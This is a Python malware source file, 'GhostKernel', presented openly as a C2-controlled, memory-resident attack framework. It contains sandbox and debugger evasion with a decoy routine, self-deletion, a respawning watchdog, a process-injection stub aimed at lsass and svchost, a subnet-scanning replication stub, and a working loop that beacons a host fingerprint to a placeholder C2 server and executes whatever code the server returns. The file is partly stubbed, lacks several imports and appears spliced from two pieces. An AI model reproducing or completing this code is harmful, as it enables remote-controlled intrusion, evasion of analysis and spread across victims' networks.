import hashlib
import os
import socket
import threading
import time
import random
import ctypes
import uuid
import psutil



class GhostKernel:
    @staticmethod
    def detect_analysis_env():
        indicators = {
            "cpu": os.cpu_count() < 2,
            "ram": psutil.virtual_memory().total < 2 * 1024**3,
            "time_warp": GhostKernel._time_check(),
            "debugger": ctypes.windll.kernel32.IsDebuggerPresent() if os.name == "nt" else False,
            "tools": any(os.path.exists(p) for p in [
                "/usr/bin/strace", "/usr/bin/gdb", "C:\\x32dbg", "C:\\x64dbg", "C:\\IDA"
            ])
        }
        if any(indicators.values()):
            print("ANALYSIS DETECTED – ACTIVATING DECOY PROTOCOL")
            GhostKernel._decoy()
            return True
        return False

    @staticmethod
    def _time_check():
        t0 = time.time()
        time.sleep(1.5)
        return (time.time() - t0) < 1.0

    @staticmethod
    def _decoy():
        actions = ["Updating system", "Running diagnostics", "Verifying signatures"]
        for _ in range(3):
            print(f"[DECOY] {random.choice(actions)}")
            time.sleep(random.uniform(0.5, 2.0))


#!/usr/bin/env python3

"""
GhostKernel 😈 Level ∞
Apex Predator Framework — Polymorphic, Memory-Resident, C2-Controlled, Self-Healing
"""



C2_URL = "http://your-c2-server.example.com/c2"
C2_KEY = Fernet.generate_key()  # Replace with pre-shared key

fernet = Fernet(C2_KEY)

class GhostKernelInfinity:

    def __init__(self):
        self.identity = self._generate_identity()
        self._self_delete()
        threading.Thread(target=self._self_watchdog, daemon=True).start()
        self._inject()
        self._memory_resident()
        self._c2_loop()

    def _generate_identity(self):
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
        host = socket.gethostname()
        ip = socket.gethostbyname(host)
        return hashlib.sha256(f"{mac}{host}{ip}".encode()).hexdigest()

    def _self_delete(self):
        path = os.path.abspath(sys.argv[0])
        threading.Thread(target=lambda: (time.sleep(1), os.remove(path)), daemon=True).start()

    def _self_watchdog(self):
        while True:
            if not psutil.Process(os.getpid()).is_running():
                subprocess.Popen([sys.executable] + sys.argv)
            time.sleep(5)

    def _inject(self):
        """Inject code into a benign process to hide."""
        targets = ["explorer.exe", "lsass.exe", "svchost.exe"]
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in targets:
                # ⛔ Here you would use ctypes or native API to inject
                break

    def _memory_resident(self):
        """Erase traces from disk completely."""
        try:
            os.remove(sys.argv[0])
            open('/dev/shm/.ghost', 'w').write("active")
        except:
            pass

    def _c2_loop(self):
        while True:
            payload = self._fetch_c2()
            if payload:
                self._execute_payload(payload)
            time.sleep(random.randint(5, 15))

    def _fetch_c2(self):
        try:
            beacon = {"id": self.identity, "status": "alive"}
            data = fernet.encrypt(str(beacon).encode())
            resp = requests.post(C2_URL, data=data, timeout=10)
            if resp.status_code == 200:
                return fernet.decrypt(resp.content).decode()
        except:
            pass
        return None

    def _execute_payload(self, payload):
        try:
            exec(payload, {"__builtins__": __builtins__})
        except Exception as e:
            pass

    def lateral_move(self):
        """Scan local subnet and replicate."""
        base_ip = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1])
        for i in range(2, 255):
            target_ip = f"{base_ip}.{i}"
            # Attempt SSH brute, SMB exploit, etc.
            # Copy self to target and execute remotely
            time.sleep(0.1)

